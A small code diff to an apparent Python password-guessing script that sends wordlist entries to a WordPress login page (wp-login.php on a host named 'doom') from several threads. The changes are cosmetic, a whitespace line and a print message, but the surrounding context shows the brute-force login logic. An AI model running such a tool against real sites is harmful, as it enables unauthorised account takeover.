@@ -14,7 +14,7 @@ def check_pass(passwords, threadNum, timing):
 	regex = ur"<strong>ERROR</strong>"
 	url="http://doom:8000/wp-login.php"
 	global MATCH
-	
+
 	MATCH = False
 	for i in range(len(passwords)):
 		payload = {'log':user, 'pwd':passwords[i],'wp-submit':'Log In'}
@@ -81,7 +81,7 @@ def main(argv):
 	chunks = lambda l, n: [l[x: x+n] for x in xrange(0,len(l), n)]
 	# chunky!
 	password_lines = chunks(lines, len(lines)/THREADS)
-	print "Using average size of %d lines/worker" % (len(password_lines[0]))
+	print "Using average size of %d passwords/worker" % (len(password_lines[0]))
 
 	# Fire off worker threads with each chunk.
 	print "Starting Workers..."
